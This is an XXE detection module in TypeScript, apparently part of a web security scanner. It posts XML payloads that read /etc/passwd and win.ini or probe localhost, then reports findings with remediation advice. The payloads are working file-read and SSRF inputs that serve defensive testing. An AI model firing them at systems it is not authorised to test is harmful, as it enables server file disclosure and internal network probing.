import type { ScanModuleInterface, EndpointInfo, ModuleFinding } from '../scanner/orchestrator';
import type { HttpClient } from '../scanner/http-client';
import { expandEndpoint } from './_params';

const XXE_PAYLOADS = [
  {
    name: 'File Read (/etc/passwd)',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    markers: ['root:', '/bin/bash', '/bin/sh', 'nobody:', '/home/'],
  },
  {
    name: 'File Read (Windows)',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    markers: ['[fonts]', '[extensions]', 'for 16-bit'],
  },
  {
    name: 'Internal Network Probe',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>',
    markers: ['<html', '<!DOCTYPE', 'HTTP/'],
  },
  {
    name: 'Parameter Entity (Blind)',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><root>test</root>',
    markers: [],
  },
];

const XML_CONTENT_TYPES = ['text/xml', 'application/xml', 'application/soap+xml', 'application/xhtml+xml'];

export class XxeModule implements ScanModuleInterface {
  id = 'xxe';
  name = 'XXE Detection';

  async scan(url: string, endpoints: EndpointInfo[], client: HttpClient): Promise<ModuleFinding[]> {
    const findings: ModuleFinding[] = [];

    // Expand endpoints so parameterless ones get common params for XML body testing
    const allEndpoints: EndpointInfo[] = [];
    for (const rawEp of endpoints) {
      allEndpoints.push(...expandEndpoint(rawEp));
    }

    // Find XML-accepting endpoints
    const xmlEndpoints = allEndpoints.filter((ep) =>
      ep.method === 'POST' && (
        XML_CONTENT_TYPES.some((ct) => ep.contentType.includes(ct)) || ep.params.length === 0
      )
    );

    // Also test the main URL and common API paths
    const testUrls = [url, ...xmlEndpoints.map((ep) => ep.url)];
    const tested = new Set<string>();

    for (const testUrl of testUrls) {
      if (tested.has(testUrl)) continue;
      tested.add(testUrl);

      for (const contentType of ['text/xml', 'application/xml']) {
        for (const { name, payload, markers } of XXE_PAYLOADS) {
          const res = await client.post(testUrl, payload, { 'Content-Type': contentType });
          if (res.status === 0 || res.status >= 500) continue;

          // Check for file content in response
          const hasMarker = markers.some((m) => res.body.includes(m));
          if (hasMarker) {
            findings.push({
              severity: 'critical',
              title: `XML External Entity Injection (${name})`,
              description: `The endpoint "${testUrl}" processes XML with external entity expansion. The payload successfully read server files or probed internal services. This can lead to file disclosure, SSRF, and potentially remote code execution.`,
              url: testUrl,
              remediation: 'Disable DTD processing and external entities in your XML parser. In Java: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true). In PHP: libxml_disable_entity_loader(true).',
              cwe_id: 'CWE-611', owasp_category: 'A03:2021', cvss_score: 9.1,
              evidence: { payload_name: name, content_type: contentType, response_preview: res.body.slice(0, 300) },
            });
            return findings;
          }

          // Check for XML parsing errors that indicate processing
          if (res.body.includes('DOCTYPE') || res.body.includes('entity') || res.body.includes('parser error')) {
            findings.push({
              severity: 'medium',
              title: 'XML Parser Accepts DTDs (Potential XXE)',
              description: `The endpoint "${testUrl}" processes XML input and appears to parse DTD declarations. While the payload didn't extract data, the XML parser may be vulnerable to blind XXE or denial-of-service via entity expansion.`,
              url: testUrl,
              remediation: 'Disable DTD processing entirely in the XML parser configuration.',
              cwe_id: 'CWE-611', owasp_category: 'A03:2021', cvss_score: 5.3,
              evidence: { content_type: contentType },
            });
            break;
          }
        }
      }
    }

    return findings;
  }
}
